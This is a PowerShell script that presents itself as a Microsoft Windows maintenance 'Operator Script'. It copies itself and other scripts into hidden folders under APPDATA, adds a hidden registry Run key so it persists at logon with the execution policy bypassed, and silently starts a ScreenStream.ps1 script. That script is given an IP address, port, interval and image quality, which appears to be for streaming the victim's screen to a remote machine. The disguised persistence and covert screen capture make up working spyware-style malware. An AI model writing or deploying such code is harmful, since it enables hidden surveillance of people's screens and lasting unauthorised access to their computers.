# Microsoft Windows PowerShell Operator Script
# This script manages PowerShell operations for system maintenance and updates.
# It ensures necessary files are in place and configures startup for seamless operation.

# Environment variables and paths
$appDataPath = 'APPDATA'
$microsoftWindowsPowerShellPath = 'Microsoft\Windows\PowerShell'
$operationFolder = 'operation'
$dateTimeFormat = 'yyyy-MM-dd HH:mm:ss'
$registryPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
$operatorKeyName = 'WinOperator'
$powerShellExe = 'powershell.exe'
$hiddenExecutionArgs = '-WindowStyle Hidden -ExecutionPolicy Bypass -File'
$screenStreamScript = 'ScreenStream.ps1'
$arg14 = '-a14'
$ipAddress = '192.168.178.197'
$arg15 = '-a15'
$port = '8080'
$arg16 = '-a16'
$interval = '20'
$arg17 = '-a17'
$quality = '70'
$ps1Filter = '*.ps1'
$hiddenAttribute = 'Hidden'
$systemSubfolder = 'System'  # Subfolder for organized system files

# Get current script path and directory
$scriptPath = $MyInvocation.MyCommand.Path
$scriptDir = Split-Path -Path $scriptPath -Parent
$scriptName = Split-Path -Path $scriptPath -Leaf

# Construct destination paths
$baseDir = Join-Path -Path $(Get-Content Env:$appDataPath) -ChildPath $microsoftWindowsPowerShellPath
$hiddenDir = Join-Path -Path $baseDir -ChildPath $operationFolder
$systemDir = Join-Path -Path $hiddenDir -ChildPath $systemSubfolder  # System subfolder for deeper nesting
$destScript = Join-Path -Path $systemDir -ChildPath $scriptName

# Check if script is not already in destination
if ($scriptPath -ne $destScript) {
    try {
        # Create base directory if it doesn't exist
        if (-not (Test-Path $baseDir)) {
            New-Item -Path $baseDir -ItemType Directory -Force | Out-Null
        }
        
        # Create and hide operation directory
        if (-not (Test-Path $hiddenDir)) {
            New-Item -Path $hiddenDir -ItemType Directory -Force | Out-Null
            $folder = Get-Item $hiddenDir -Force
            $folder.Attributes = $folder.Attributes -bor [System.IO.FileAttributes]::$hiddenAttribute
        }
        
        # Create and hide system subfolder
        if (-not (Test-Path $systemDir)) {
            New-Item -Path $systemDir -ItemType Directory -Force | Out-Null
            $sysFolder = Get-Item $systemDir -Force
            $sysFolder.Attributes = $sysFolder.Attributes -bor [System.IO.FileAttributes]::$hiddenAttribute
        }
        
        # Copy all .ps1 files to system directory
        $psFiles = Get-ChildItem -Path $scriptDir -Filter $ps1Filter -File
        foreach ($file in $psFiles) {
            $destFile = Join-Path -Path $systemDir -ChildPath $file.Name
            Copy-Item -Path $file.FullName -Destination $destFile -Force -ErrorAction Stop
        }
        
        # Clean up old VBS startup if exists
        $startupDir = Join-Path -Path $(Get-Content Env:$appDataPath) -ChildPath "Microsoft\Windows\Start Menu\Programs\Startup"
        $vbsPath = Join-Path -Path $startupDir -ChildPath "WinOp.vbs"
        if (Test-Path $vbsPath) {
            Remove-Item -Path $vbsPath -Force | Out-Null
        }
        
        # Set registry for persistence
        $runValue = "$powerShellExe $hiddenExecutionArgs `"$destScript`""
        Set-ItemProperty -Path $registryPath -Name $operatorKeyName -Value $runValue -Force | Out-Null
    } catch {
        # Graceful exit on error
        return
    }
    
    # Start other .ps1 scripts from system directory
    $otherPsFiles = Get-ChildItem -Path $systemDir -Filter $ps1Filter -File | Where-Object { $_.Name -ne $scriptName }
    foreach ($file in $otherPsFiles) {
        $otherScript = $file.FullName
        try {
            Start-Process $powerShellExe -ArgumentList "$hiddenExecutionArgs `"$otherScript`"" -WindowStyle $hiddenAttribute | Out-Null
        } catch {}
    }
    
    # Start ScreenStream.ps1 if exists in system directory
    $screenStreamPath = Join-Path -Path $systemDir -ChildPath $screenStreamScript
    if (Test-Path $screenStreamPath) {
        try {
            Start-Process $powerShellExe -ArgumentList "$hiddenExecutionArgs `"$screenStreamPath`" $arg14 `"$ipAddress`" $arg15 $port $arg16 $interval $arg17 $quality" -WindowStyle $hiddenAttribute | Out-Null
        } catch {}
    }
} else {
    # If already in destination, start other scripts
    $otherPsFiles = Get-ChildItem -Path $systemDir -Filter $ps1Filter -File | Where-Object { $_.Name -ne $scriptName }
    foreach ($file in $otherPsFiles) {
        $otherScript = $file.FullName
        try {
            Start-Process $powerShellExe -ArgumentList "$hiddenExecutionArgs `"$otherScript`"" -WindowStyle $hiddenAttribute | Out-Null
        } catch {}
    }
    
    # Start ScreenStream.ps1 if exists
    $screenStreamPath = Join-Path -Path $systemDir -ChildPath $screenStreamScript
    if (Test-Path $screenStreamPath) {
        try {
            Start-Process $powerShellExe -ArgumentList "$hiddenExecutionArgs `"$screenStreamPath`" $arg14 `"$ipAddress`" $arg15 $port $arg16 $interval $arg17 $quality" -WindowStyle $hiddenAttribute | Out-Null
        } catch {}
    }
}

# End of Microsoft Windows PowerShell Operator Script